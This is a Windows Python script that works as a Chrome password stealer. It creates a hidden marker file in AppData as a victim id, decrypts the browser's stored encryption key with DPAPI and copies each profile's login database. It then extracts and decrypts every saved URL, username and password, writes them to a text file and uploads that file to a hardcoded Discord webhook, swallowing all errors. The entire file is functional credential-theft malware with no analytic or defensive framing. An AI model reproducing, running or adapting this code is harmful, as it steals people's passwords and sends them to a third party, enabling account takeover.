import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import requests
import string
import random

def generate_random_string(length=2048):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def check_and_create_file():
    random_number = random.randint(1000000000000000, 9999999999999999)
    filename = f"temp-{random_number}.rmb"
    appdata_folder = os.path.join(os.path.expanduser("~"), "AppData", "Local")
    existing_files = [f for f in os.listdir(appdata_folder) if f.startswith("temp-") and f.endswith(".rmb") and len(f) == len("temp-1234567890123456.rmb")]
    global id_s
    id_s = {existing_files[0]} if existing_files else None
    if not existing_files:
        random_string = generate_random_string()
        file_path = os.path.join(appdata_folder, filename)
        with open(file_path, 'w') as f:
            f.write(random_string)

check_and_create_file()

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except:
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except:
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except:
        return None

def encrypt_file(file_path):
    key = os.urandom(16)
    cipher = AES.new(key, AES.MODE_GCM)
    with open(file_path, 'rb') as f:
        file_data = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(file_data)
    encrypted_file_path = f"{file_path}.enc"
    with open(encrypted_file_path, 'wb') as f:
        f.write(cipher.nonce + tag + ciphertext)
    os.remove(file_path)

def send_file_to_discord(file_path):
    webhook_url = "https://discord.com/api/webhooks/1296913017165971567/aQJr8qDGKJGnQJI7yb5g56UamIsfrWuppfU590WqTD6YSZIOCbXSj-Duy0Tg-JVT0Et7"
    with open(file_path, "rb") as file:
        requests.post(
            webhook_url,
            files={"file": file},
            data={"content": f"\n‎\n‎\n**{id_s}** Saved Passwords:\n———————————————————————————————"}
        )

if __name__ == '__main__':
    try:
        decrypted_passwords = []
        secret_key = get_secret_key()
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) is not None]
        for folder in folders:
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
            conn = get_db_connection(chrome_path_login_db)
            if secret_key and conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index, login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        decrypted_passwords.append(f"URL: {url}\nUser Name: {username}\nPassword: {decrypted_password}\n{'*' * 50}")
                cursor.close()
                conn.close()
                if os.path.exists("Loginvault.db"):
                    os.remove("Loginvault.db")
                else:
                    encrypt_file("Loginvault.db")

        if decrypted_passwords:
            with open('decrypted_password.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join(decrypted_passwords))
            send_file_to_discord('decrypted_password.txt')

    except:
        pass
